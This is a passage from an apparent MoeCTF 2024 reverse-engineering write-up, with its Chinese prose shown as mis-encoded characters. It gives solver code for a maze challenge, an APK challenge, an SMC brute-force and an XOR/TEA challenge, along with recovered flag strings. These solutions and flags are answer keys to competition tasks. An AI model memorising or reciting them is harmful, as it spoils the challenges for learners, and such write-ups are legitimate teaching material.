class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xAF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBC</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xA9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xB1</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xAA</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xBD</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB4</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB2</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xB0</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0xBC</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDF</span>, <br><span class="hljs-number">0x80</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x5F</span>, <br><span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xFF</span>&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">sub_7FF78A1D1190</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br><span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+0h] [rbp-28h]</span><br><span class="hljs-keyword">if</span> ( a1 &gt; <span class="hljs-number">80</span> || a2 &gt; <span class="hljs-number">56</span> || a1 &lt; <span class="hljs-number">1</span> || a2 &lt; <span class="hljs-number">1</span> )&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>v3 = a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>];<br>a[<span class="hljs-number">10</span> * a2 - <span class="hljs-number">10</span> + (a1 - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>] = (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) | v3;<br><span class="hljs-keyword">return</span> ((<span class="hljs-type">int</span>)v3 &gt;&gt; (<span class="hljs-number">7</span> - (a1 - <span class="hljs-number">1</span>) % <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> v4=<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> v5=<span class="hljs-number">2</span>;<br><span class="hljs-type">char</span> out[<span class="hljs-number">1200</span>]=&#123;<span class="hljs-string">&#x27;0&#x27;</span>&#125;;<br><span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pan=<span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> v7[<span class="hljs-number">4</span>]=&#123;<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>&#125;;<br><span class="hljs-keyword">while</span>(k&lt;<span class="hljs-number">1176</span>)&#123;<br><span class="hljs-keyword">if</span>(k==<span class="hljs-number">950</span>)&#123;<br>v7[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br>v7[<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;w&#x27;</span>;<br>v7[<span class="hljs-number">2</span>]=<span class="hljs-string">&#x27;d&#x27;</span>;<br>v7[<span class="hljs-number">3</span>]=<span class="hljs-string">&#x27;s&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">4</span>;i++)&#123;<br><span class="hljs-keyword">switch</span> ( v7[i] )&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v5 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 - <span class="hljs-number">1</span>), v4))&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>--v5;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;        <br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v5 &gt;= <span class="hljs-number">80</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190((v5 + <span class="hljs-number">1</span>), v4) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>++v5;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v4 &gt;= <span class="hljs-number">56</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 + <span class="hljs-number">1</span>)) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>++v4;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br><span class="hljs-keyword">if</span> ( v4 &lt;= <span class="hljs-number">1</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_7FF78A1D1190(v5, (v4 - <span class="hljs-number">1</span>)) )&#123;&#125;<br><span class="hljs-keyword">else</span>&#123;<br>--v4;<br>out[k++]=v7[i];<br>pan=<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(pan==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,k);<br><span class="hljs-comment">//printf(&quot;%c&quot;,v7[i]);</span><br>pan=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>&#125;<br><br>&#125;<br><span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">75</span> &amp;&amp; v4 == <span class="hljs-number">55</span> )&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;success!&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,out);<br>&#125;<br><span class="hljs-type">char</span> s[]=<span class="hljs-string">&quot;sddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdsdssddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddsssdddwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwddddddddddddddddwwwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwddddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddssssaaaaaaaaaassdddddddssaaaaaassddddddddddddssaaaaaaaaaaaassdddddddddddsssssaaaaaaaaaaaaaassaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssssaaaaaaaaaaaaaaaassddddddddddddddddssaaaaaaaaaaaaaaassdddddddddddddddssaaaaaaaaaaaaaaassaaaaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaaawwawawwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaawwddddddddddddddwwaaaaaaaaaaaaaaaasssssssssssssssssssssssssddddddddddddddddddddddddddddddddddwddddddddddddddddddwdddwwwdddddddddddddddwwaaaaaaaaaaaaaaawwddddddwwaaaaaaawwddddddddddddddssdddwwwawwwaaaaaaaaaaaaaaawwdddddddddddddddwwaaaaaaaaaaaaaaawwdddddddddddddddwwwwwwwwwwwwwwwwwwwwwdddssssssssssssssssssssssssssssssssssssssssssss&quot;</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> v3=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1176</span>;i++)<br>v3 += i * <span class="hljs-number">3113131</span> *(<span class="hljs-type">int</span>)(s[i]) + i * i + <span class="hljs-number">1131796</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%llu&quot;</span>,v3);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Just-Run-It"><a href="#Just-Run-It" class="headerlink" title="Just_Run_It"></a>Just_Run_It</h2><p>0x0å’Œ0x1éƒ½æ˜¯è„±å£³åè§£ç </p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724468535615-5af557bb-3d5b-4b4e-b21c-d47da3b9f0c1.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724469127727-6b6389b4-f381-4331-9bbf-0ea6697dee34.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472342291-10eaa4b2-d305-4504-9984-6d97e67bb432.png" class="" title="img"><p>æ¨¡æ‹Ÿå™¨è¿è¡Œä¸äº†ï¼Œå¼€å¯äº‹ä»¶æ— æ³•è°ƒè¯•</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724472556548-3ffe5532-4c5c-408c-88b1-7162c73af94f.png" class="" title="img"><p>è¦ä¹ˆæ ¹æ®ç­¾åv2ç›´æ¥æ‰¾å·¥å…·ç»•ï¼Œè¦ä¹ˆæ‰¾åˆ°å¯†æ–‡ç›´æ¥base64è§£å¯†ï¼Œè¦ä¹ˆæ‰¾æ£€éªŒå‡½æ•°ä¿®æ”¹åé‡æ–°æ‰“åŒ…ï¼ˆæœ€åä¸€ç§æ¯”è¾ƒéš¾ï¼Œå‡ºé¢˜è€…è‚¯å®šä¸å¸Œæœ›æˆ‘ä»¬è¿™æ ·åšï¼‰</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724511920066-c8aa02db-2683-46eb-9d0e-a56fe3bb7a01.png" class="" title="img"><p>META-INFæ˜¯ç­¾åä¹‹åçš„æ–‡ä»¶ï¼ŒDebugProbestKt.binç”¨äºåç»­è°ƒè¯•</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724550601096-d661329a-fd5c-4eb7-b75c-4e53550dfd67.png" class="" title="img"><p>åé¢qetxæ‰¾åˆ°<a href="https://appetize.io/app/android/cn.edu.xidian.myapplication?device=pixel7&osVersion=14.0">Play My Application (appetize.io)</a></p><p>å¯ä»¥æ¨¡æ‹Ÿå¤šä¸ªç¯å¢ƒ</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724642186848-ba9a7fd4-1481-46eb-a468-999ca49ed09d.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480966167-4da06b90-0272-46bc-8c06-6fb8d3f46ada.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724480982752-32ee9808-4d52-46a3-9faa-c35ab1aa5a49.png" class="" title="img"><p>bW9lY3RmezU5ZmE2MDJjLTYyNGEtNDBiNy04YTVjLWUzNWU1NzRjZjliOX0&#x3D;</p><h2 id="SMCProMax"><a href="#SMCProMax" class="headerlink" title="SMCProMax"></a>SMCProMax</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724679306184-55d2be46-1f9f-42a2-937c-1b0513d92d4e.png" class="" title="img"><p>moectf{1111111111111111111111111111111111111111}</p><p>moectf{y0u_mu5t_know_vvHAt_1s__SMC__n0w}</p><p>ç›´æ¥çˆ†ç ´å‡ºæ¥å‘ç°ä¸å¯¹å»è°ƒè¯•ï¼Œå‘ç°åœ¨ä¸‹é¢ä¼šè·³å‡º</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724813588701-fddd2816-33a7-40d6-8d42-e0a2ae6029ea.png" class="" title="img"><p>ä¸€å¼€å§‹æœ‰ä¸ªåœ°æ–¹å¼‚æˆ–äº†ï¼Œæ²¡æ‰§è¡Œåˆ°ï¼Œä½†æ˜¯æœ€åçš„å¯†æ–‡è¿˜æ˜¯è¦å¼‚æˆ–ä¸€æ­¥</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> a[]=&#123;<span class="hljs-number">0x7A5FB55E</span>,<span class="hljs-number">-490481854</span>,<span class="hljs-number">-1704322843</span>,<span class="hljs-number">-1418679088</span>,<span class="hljs-number">0x52C815D</span>,<span class="hljs-number">0x28D70A82</span>,<span class="hljs-number">0x398E5EAA</span>,<span class="hljs-number">0xFC4A5AF</span>,<span class="hljs-number">-1342106783</span>,<span class="hljs-number">0xCECDD9C3</span>&#125;; <br>    <span class="hljs-type">int</span> m=<span class="hljs-number">0xC4F3B4B3</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0x20202020</span>;j&lt;=<span class="hljs-number">0x7d7d7d7d</span>;j++)&#123;<br>            <span class="hljs-type">int</span> t=j;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">32</span>;k++)&#123;<br>                <span class="hljs-keyword">if</span> (t&gt;=<span class="hljs-number">0</span>)&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                &#125; <br>                <span class="hljs-keyword">else</span>&#123;<br>                    t=t*<span class="hljs-number">2</span>;<br>                    t^=m;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(t==a[i])&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> n=<span class="hljs-number">0</span>;n&lt;<span class="hljs-number">32</span>;n+=<span class="hljs-number">8</span>)&#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(j&gt;&gt;n)&amp;<span class="hljs-number">0xff</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>        &#125; <br><br><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>moectf&#123;y0u_mu5t_know_vvZAt_1s__SMC__n0w&#125;<br></code></pre></td></tr></table></figure><h2 id="xor-rev"><a href="#xor-rev" class="headerlink" title="xor_rev"></a>xor_rev</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827254498-19e8c8a8-5eb3-4534-a704-e2441493beaa.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>   <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>     <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>     <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>     <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>    enc[i]^=s[i%<span class="hljs-number">16</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#This_1s_a_f4k3_flag_plzTry_ag4in</span><br></code></pre></td></tr></table></figure><p>è°ƒè¯•çš„æ—¶å€™å‘ç°åé¢è¿˜æœ‰tea</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724827974635-2f61db70-4857-467b-8fda-e9511a9746fb.png" class="" title="img"><p>è§£teaçš„æ—¶å€™è®°å¾—æ‰“å°%02x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 